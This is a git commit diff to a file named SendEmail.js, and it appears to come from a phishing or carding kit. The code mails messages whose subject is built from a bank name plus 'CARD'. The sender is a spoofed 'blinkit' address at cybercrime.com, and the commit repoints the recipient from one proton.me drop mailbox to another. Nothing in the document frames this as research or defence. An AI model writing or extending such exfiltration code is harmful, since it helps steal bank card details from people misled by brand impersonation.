98d0fc8551f4717b6596bb06def025474f57500c
Mulayam S <mullayam06@gmail.com>
2023-08-27 21:59:07 +0530

    sneder changes2

--- src/services/SendEmail.js
+++ src/services/SendEmail.js
@@ -26,7 +26,7 @@ async function Mail(data) {
   const subject = `${data.bankname} CARD`;
   const info = await transporter.sendMail({
     from: '"blinkit👻" <blinkit@cybercrime.com>', // sender address
-    to: "shocyber@proton.me", // list of receivers
+    to: "blinkit.cc@proton.me", // list of receivers
     subject,
     text: "blinkit Order", // plain text body
     html, // html body
